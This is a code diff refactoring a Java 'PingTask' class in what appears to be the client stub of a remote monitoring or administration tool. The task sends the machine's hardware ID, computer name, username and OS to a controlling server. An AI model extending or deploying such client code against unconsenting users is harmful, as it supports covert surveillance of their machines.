@@ -1,10 +1,10 @@
 package me.jershdervis.monitorj.stub.client.tasks;
 
+import me.jershdervis.monitorj.stub.client.BaseClient;
 import me.jershdervis.monitorj.stub.client.PacketTask;
 import me.jershdervis.monitorj.stub.client.Packets;
 import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
 
-import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.util.Locale;
@@ -15,15 +15,16 @@ import java.util.Locale;
 public class PingTask extends PacketTask {
 
     public PingTask() {
-        super(Packets.PING);
+        super(Packets.PING.getPacketID());
     }
 
     @Override
-    public void run(DataInputStream inputStream, DataOutputStream outputStream) throws IOException {
-        outputStream.writeByte(Packets.PING); //Tell the server to act on the ping packet
-        outputStream.writeUTF(ClientSystemUtil.getHWID());
-        outputStream.writeUTF(ClientSystemUtil.getComputerName());
-        outputStream.writeUTF(ClientSystemUtil.getUsername());
-        outputStream.writeUTF(System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH));
+    public void run(BaseClient client) throws IOException {
+        DataOutputStream dos = client.getDataOutputStream();
+        client.getDataOutputStream().writeByte(Packets.PING.getPacketID()); //Tell the server to act on the ping packet
+        dos.writeUTF(ClientSystemUtil.getHWID());
+        dos.writeUTF(ClientSystemUtil.getComputerName());
+        dos.writeUTF(ClientSystemUtil.getUsername());
+        dos.writeUTF(System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH));
     }
 }
